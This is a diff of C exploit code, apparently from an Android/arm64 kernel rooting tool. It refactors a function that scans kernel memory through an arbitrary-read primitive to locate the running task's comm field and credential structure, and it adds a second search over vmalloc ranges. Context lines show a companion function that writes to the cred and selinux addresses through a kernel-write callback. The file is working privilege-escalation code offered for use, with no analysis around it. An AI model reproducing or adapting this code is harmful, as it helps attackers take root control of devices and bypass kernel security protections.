@@ -8,22 +8,107 @@
 
 #define MMAP_SIZE			0x40000
 #define READ_SPLIT_ONE_SIZE		(MMAP_SIZE-0x1000)
-#define MMAP_CRED_SIZE		200
+#define MMAP_CRED_SIZE		100
 
-#define KERNEL_START_INIT  	0xffffffc000480000UL
-#define KERNEL_SEARCH_START 0xffffffc000000000UL
-#define KERNEL_STOP_INIT   (KERNEL_SEARCH_START + 1024 * 1024 * 1024)
+#define KCORE_VMALLOC_START 	0xffffff8000000000
+#define KCORE_VMALLOC_END 		0xffffffbbfffeffff
+
+#define KERNEL_START_INIT  	0xffffffc000480000UL 
+#define KERNEL_STOP_INIT	0xffffffffffffffffUL
+
+static void* root_get_cred_(int (*get_kernel_data)(void* kernel_start, void* local_addr, int size), 
+	unsigned long start_addr, unsigned long end_addr, void* local_mmap, int local_mmap_size, void* local_mmap2, int local_mmap2_size,
+	struct process_identify* pi, int* offset_in_cred, unsigned long mask){
+	unsigned long kernel_search_start_addr;
+	int is_found; 
+	char* comm_ptr; 
+	void* cred_addr;
+	unsigned int* cred_uid_addr;
+	int i;
+	
+	for(kernel_search_start_addr=start_addr; kernel_search_start_addr<end_addr; ){
+		if( local_mmap_size != get_kernel_data((void*)kernel_search_start_addr, local_mmap, local_mmap_size) ){
+			//printf("[--] <root_get_cred_> failed to get_kernel_data\n");
+			//return NULL;
+			goto continue_for_label;
+		}
+		//printf("[++] <root_get_cred_> kernel_search_start_addr=%p\n", (void*)kernel_search_start_addr);
+		
+		//定位comm
+		is_found = 0;
+		comm_ptr = (char*)local_mmap;
+		do{
+			if( 0 == memcmp(comm_ptr, TASK_COMM_NAME_SELF, strlen(TASK_COMM_NAME_SELF)+1) ){
+				is_found = 1;
+				break;
+			}
+			comm_ptr+=sizeof(void*); 
+		}while(comm_ptr < (char*)local_mmap + local_mmap_size - strlen(TASK_COMM_NAME_SELF)-1);
+		
+		if( 0 == is_found ){
+			goto continue_for_label;
+		}
+		
+		printf("[++] <root_get_cred_> comm=%p 1\n", comm_ptr);
+		
+		comm_ptr = (char*)((unsigned long)comm_ptr & (~(sizeof(void*)-1)) ); 
+		
+		if( (unsigned long)comm_ptr-4*sizeof(void*) < (unsigned long)local_mmap ){//正好是comm在开始位置
+			goto continue_for_label;
+		}
+		
+		printf("[++] <root_get_cred_> comm=%p 2\n", comm_ptr);
+		
+		//定位具体的cred
+		is_found = 0;
+		for(i=0;i<4;i++){
+			cred_addr = *(void**)((unsigned long)comm_ptr-(i+1)*sizeof(void*));
+			printf("[++] <root_get_cred_> cred_addr=%p\n", cred_addr);
+			if( (unsigned long)cred_addr > start_addr && mask == ( (unsigned long)cred_addr & mask ) ){
+				if( local_mmap2_size != get_kernel_data(cred_addr, local_mmap2, local_mmap2_size) ){
+					printf("[--] <root_get_cred_> failed to get_kernel_data 2\n");
+					continue;
+				} 
+				cred_uid_addr = (unsigned int*)local_mmap2;
+				while( (unsigned long)cred_uid_addr < (unsigned long)local_mmap2+local_mmap2_size-sizeof(struct process_identify)){
+					if( 0 == memcmp(cred_uid_addr, pi, sizeof(struct process_identify)) ){
+						is_found = 1;
+						break;
+					}
+					cred_uid_addr = cred_uid_addr + 1;
+				}
+				if( 1 == is_found ){
+					break;
+				} 
+			}
+		}
+		if( 0 == is_found ){
+			goto continue_for_label;
+		}
+		
+		printf("[++] <root_get_cred_> offset cred and comm=%ld\n", (i+1)*sizeof(void*));
+		
+		*offset_in_cred = (int)( (unsigned long)cred_uid_addr - (unsigned long)local_mmap2 );
+		
+		return cred_addr;
+		
+		break;
+		
+continue_for_label: 
+		if( 0 == is_found ){
+			kernel_search_start_addr+=READ_SPLIT_ONE_SIZE; 
+		}else{
+			kernel_search_start_addr-=0x1000; 
+		}
+	}
+	return NULL;
+}
 
 void* root_get_cred(int (*get_kernel_data)(void* kernel_start, void* local_addr, int size), struct process_identify* pi, int* offset_in_cred){
 	char name[16] = {0};
 	void* local0;
-	void* local1;
-	unsigned long kernel_search_start_addr;
-	char* comm_ptr; 
-	int is_found; 
-	void* cred_addr;
-	unsigned int* cred_uid_addr;
-	int i;
+	void* local1;   
+	void* cred;
 	
 	prctl(PR_GET_NAME, name);
 	printf("[++] <root_get_cred> name=%s\n", name);
@@ -43,85 +128,16 @@ void* root_get_cred(int (*get_kernel_data)(void* kernel_start, void* local_addr,
 	}
 	printf("[++] <root_get_cred> mmap addr 2 ******** %p~%p\n", local1, (void*)((unsigned long)local1+MMAP_CRED_SIZE));
 	
-	for(kernel_search_start_addr=KERNEL_START_INIT; kernel_search_start_addr<KERNEL_STOP_INIT; ){
-		if( MMAP_SIZE != get_kernel_data((void*)kernel_search_start_addr, local0, MMAP_SIZE) ){
-			//printf("[--] <root_get_cred> failed to get_kernel_data\n");
-			//return NULL;
-			goto continue_for_label;
-		}
-		//printf("[++] <root_get_cred> kernel_search_start_addr=%p\n", (void*)kernel_search_start_addr);
-		
-		//定位comm
-		is_found = 0;
-		comm_ptr = (char*)local0;
-		do{
-			if( 0 == memcmp(comm_ptr, TASK_COMM_NAME_SELF, strlen(TASK_COMM_NAME_SELF)+1) ){
-				is_found = 1;
-				break;
-			}
-			comm_ptr+=sizeof(void*); 
-		}while(comm_ptr < (char*)local0 + MMAP_SIZE - strlen(TASK_COMM_NAME_SELF)-1);
-		
-		if( 0 == is_found ){
-			goto continue_for_label;
-		}
-		
-		printf("[++] <root_get_cred> comm=%p 1\n", comm_ptr);
-		
-		comm_ptr = (char*)((unsigned long)comm_ptr & (~(sizeof(void*)-1)) ); 
-		
-		if( (unsigned long)comm_ptr-4*sizeof(void*) < (unsigned long)local0 ){//正好是comm在开始位置
-			goto continue_for_label;
-		}
-		
-		printf("[++] <root_get_cred> comm=%p 2\n", comm_ptr);
-		
-		//定位具体的cred
-		is_found = 0;
-		for(i=0;i<4;i++){
-			cred_addr = *(void**)((unsigned long)comm_ptr-(i+1)*sizeof(void*));
-			//printf("[++] <root_get_cred> cred_addr=%p\n", cred_addr);
-			if( (unsigned long)cred_addr > KERNEL_START_INIT && 0xFFFFFFC000000000UL == ( (unsigned long)cred_addr & 0xFFFFFFC000000000UL ) ){
-				if( MMAP_CRED_SIZE != get_kernel_data(cred_addr, local1, MMAP_CRED_SIZE) ){
-					printf("[--] <root_get_cred> failed to get_kernel_data 2\n");
-					continue;
-				} 
-				cred_uid_addr = (unsigned int*)local1;
-				while( (unsigned long)cred_uid_addr < (unsigned long)local1+MMAP_CRED_SIZE){
-					if( 0 == memcmp(cred_uid_addr, pi, sizeof(struct process_identify)) ){
-						is_found = 1;
-						break;
-					}
-					cred_uid_addr = cred_uid_addr + 1;
-				}
-				if( 1 == is_found ){
-					break;
-				} 
-			}
-		}
-		if( 0 == is_found ){
-			goto continue_for_label;
-		}
-		
-		*offset_in_cred = (int)( (unsigned long)cred_uid_addr - (unsigned long)local1 );
-		
-		munmap(local0, MMAP_SIZE);
-		munmap(local1, MMAP_CRED_SIZE);
-		return cred_addr;
-		
-		break;
-		
-continue_for_label: 
-		if( 0 == is_found ){
-			kernel_search_start_addr+=READ_SPLIT_ONE_SIZE; 
-		}else{
-			kernel_search_start_addr-=0x1000; 
-		}
+	cred = root_get_cred_(get_kernel_data, KERNEL_START_INIT, KERNEL_STOP_INIT, local0, MMAP_SIZE, local1, MMAP_CRED_SIZE, pi, offset_in_cred, 0xFFFFFF8000000000UL);
+	printf("[++] <root_get_cred> root_get_cred_ over\n");
+	if(NULL == cred){
+		//下面这行阻塞
+		//cred = root_get_cred_(get_kernel_data, KCORE_VMALLOC_START, KCORE_VMALLOC_END, local0, MMAP_SIZE, local1, MMAP_CRED_SIZE, pi, offset_in_cred, 0xFFFFFF8000000000UL);
 	}
 	
 	munmap(local0, MMAP_SIZE);
 	munmap(local1, MMAP_CRED_SIZE);
-	return NULL;
+	return cred;
 }
 
 int root_write_to_kernel(void* cred, int cred_offset, void* selinux, int (*write_kernel_data)(void* kernel_addr, void* local_addr, int size)){
